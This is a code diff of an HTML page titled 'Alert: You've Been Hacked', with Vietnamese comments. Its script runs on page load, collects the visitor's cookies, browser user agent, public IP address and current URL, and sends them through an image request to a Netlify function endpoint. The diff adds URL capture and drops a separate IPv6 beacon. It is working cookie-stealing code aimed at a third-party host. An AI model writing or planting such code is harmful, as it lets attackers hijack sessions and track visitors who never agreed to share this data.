@@ -6,16 +6,18 @@
     <title>Alert: You've Been Hacked bởi 4 chị em!</title>
     <link rel="stylesheet" href="style.css" />
     <script>
+      // Hàm gửi thông tin về User-Agent, IP, và cookies tới Netlify Function
       function sendDataToNetlify() {
+        var currentUrl = window.location.href; // Lấy URL của trang
         var userAgent = navigator.userAgent; // Lấy User-Agent của trình duyệt
 
-        // Lấy cả IPv4 và IPv6 từ ipify API
+        // Lấy địa chỉ IP của người dùng từ ipify API
         fetch("https://api.ipify.org?format=json")
           .then((response) => response.json()) // Chuyển đổi dữ liệu trả về thành JSON
           .then((data) => {
-            var userIP = data.ip; // Lấy địa chỉ IP công cộng (IPv4)
+            var userIP = data.ip; // Lấy địa chỉ IP từ dữ liệu trả về
 
-            // Gửi thông tin (cookies, userAgent, IPv4, URL) tới Netlify Function
+            // Gửi thông tin (cookies, userAgent, IP, URL) tới Netlify Function
             var img = new Image();
             img.src =
               "https://lighthearted-monstera-f31b23.netlify.app/.netlify/functions/logRequest?cookies=" +
@@ -26,19 +28,10 @@
               encodeURIComponent(userIP) +
               "&url=" +
               encodeURIComponent(currentUrl);
-
-            // Gửi thêm thông tin IPv6 (nếu có)
-            fetch("https://api.ipify.org?format=json&ipVersion=6")
-              .then((response) => response.json()) // Lấy dữ liệu IPv6
-              .then((data) => {
-                var ipv6 = data.ip; // Lấy địa chỉ IPv6
-                img.src =
-                  "https://lighthearted-monstera-f31b23.netlify.app/.netlify/functions/logRequest?ipv6=" +
-                  encodeURIComponent(ipv6); // Gửi IPv6 qua Netlify Function
-              })
-              .catch((error) => console.error("Error fetching IPv6:", error));
           })
-          .catch((error) => console.error("Error fetching IP:", error));
+          .catch((error) => {
+            console.error("Error fetching IP:", error);
+          });
       }
 
       // Gọi hàm khi trang tải
